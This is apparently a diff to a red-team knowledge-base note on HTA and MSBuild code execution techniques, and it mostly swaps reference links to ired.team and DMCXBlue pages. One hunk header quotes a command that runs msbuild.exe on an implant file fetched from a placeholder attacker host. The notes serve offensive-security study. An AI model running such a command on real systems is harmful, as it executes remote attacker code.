@@ -27,9 +27,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implan
 
 - [[DotNET Execution|Code Execution: MSBuild]]
 
-### Red Team Notes
-
-- [Red Team Notes: Code Execution](https://www.ired.team/offensive-security/code-execution)
+- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/LOLBAS/Code Execution/HTA]]
 
 ### Sevagas
 
@@ -37,4 +35,6 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implan
 
 ### DMCXBlue
 
-- [DMCXBlue Gitbook: HTA Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-link/links-hta-files)
+- [DMCXBlue: HTA](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-infrastructure/weaponization/hta)
+
+- [DMCXBlue: Links - HTA Files](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/initial-access/t1566-phishing/phishing-spearphishing-link/links-hta-files)
